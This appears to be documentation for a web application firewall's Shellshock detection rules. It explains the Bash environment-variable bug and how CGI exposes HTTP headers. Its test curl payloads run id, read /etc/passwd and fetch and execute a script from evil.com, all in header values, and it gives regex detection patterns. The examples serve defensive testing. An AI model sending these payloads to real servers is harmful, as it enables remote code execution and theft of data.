# Shellshock

## CVE-2014-6271 / CVE-2014-7169 — What it is

Shellshock is a vulnerability in the GNU Bash shell discovered in September 2014. Bash allowed function definitions to be exported via environment variables. The vulnerable versions (all Bash versions through 4.3) would also execute code appended after the function definition body.

**Vulnerable bash behavior:**
```bash
# Exporting a function works as expected
export foo='() { echo hello; }'

# The bug: trailing code after the closing brace also executes
export foo='() { :; }; echo VULNERABLE'
```

When a new bash process starts and imports the `foo` environment variable, it executes `echo VULNERABLE` — any code after `; }; `.

---

## How the vulnerability is exploited via HTTP

CGI (Common Gateway Interface) and some web frameworks export HTTP request headers as environment variables before spawning a shell or shell-based process. An attacker injects the Shellshock payload into a header value:

1. Attacker sends `User-Agent: () { :; }; /bin/bash -c "id > /tmp/pwned"`
2. The web server exports: `HTTP_USER_AGENT='() { :; }; /bin/bash -c "id > /tmp/pwned"'`
3. When a CGI script or shell-based utility starts a new bash process, bash imports the variable and executes the trailing command.

This affects:
- Apache + mod_cgi
- CGI scripts in any language that spawn bash (Perl CGI, PHP CGI mode)
- DHCP client hooks
- OpenSSH `ForceCommand`
- Any software that calls `system()`, `popen()`, or `exec()` and relies on the shell for environment variables

---

## All 2 rules

| Rule ID | Pattern | Description |
|---------|---------|-------------|
| `shellshock-func` | `() { [^}]*; }` followed by `;` | General bash function definition — catches any code after the closing brace |
| `shellshock-env-cmd` | `() { :; };` | The canonical Shellshock payload — empty function body with trailing command |

Both rules are `critical` severity.

---

## Example payloads

**Basic Shellshock in User-Agent:**
```bash
curl -H 'User-Agent: () { :; }; /bin/bash -c "id"' http://localhost:3000/
```

**In Referer header:**
```bash
curl -H 'Referer: () { :; }; /bin/bash -c "cat /etc/passwd"' http://localhost:3000/
```

**In Cookie header:**
```bash
curl -H 'Cookie: () { :; }; echo "Content-Type: text/plain"; echo; id' http://localhost:3000/
```

**In a custom header:**
```bash
curl -H 'X-Custom-Header: () { :; }; wget http://evil.com/shell.sh -O /tmp/s && bash /tmp/s' http://localhost:3000/
```

All of these return `403 Forbidden`. The log entry will show `source: header:user-agent` (or the relevant header name).

---

## Why all headers are scanned

CGI environments export **every** HTTP header as an environment variable. The conversion is:
- The header name is uppercased
- Hyphens are replaced with underscores
- `HTTP_` is prepended

So `X-My-Custom-Header: (){}; exploit` becomes `HTTP_X_MY_CUSTOM_HEADER=() { }; exploit`.

This means any header — not just well-known ones like `User-Agent` and `Referer` — is a viable injection vector. The WAF iterates over `Object.entries(req.headers)` to scan every header value.

---

## CVE-2014-7169

CVE-2014-7169 is a follow-on vulnerability found after the initial patch for CVE-2014-6271. The original patch incompletely closed the issue — a different trailing-code form still executed. CVE-2014-7169 was patched in Bash 4.3 patch 25.

The `shellshock-func` rule covers both variants because it matches the general pattern `() { ... }; ` rather than only the canonical `() { :; }; ` form.

---

## Affected systems

- GNU Bash through version 4.3 (all versions before patches for CVE-2014-6271)
- Apache with `mod_cgi` or `mod_cgid`
- nginx with CGI scripts
- PHP in CGI mode
- Perl CGI scripts
- DHCP clients that source bash scripts
- Git hooks written in bash

Modern systems with patched bash are not vulnerable to code execution, but the WAF blocks Shellshock payloads regardless — the payload pattern is unambiguous and has no legitimate use in HTTP parameters.
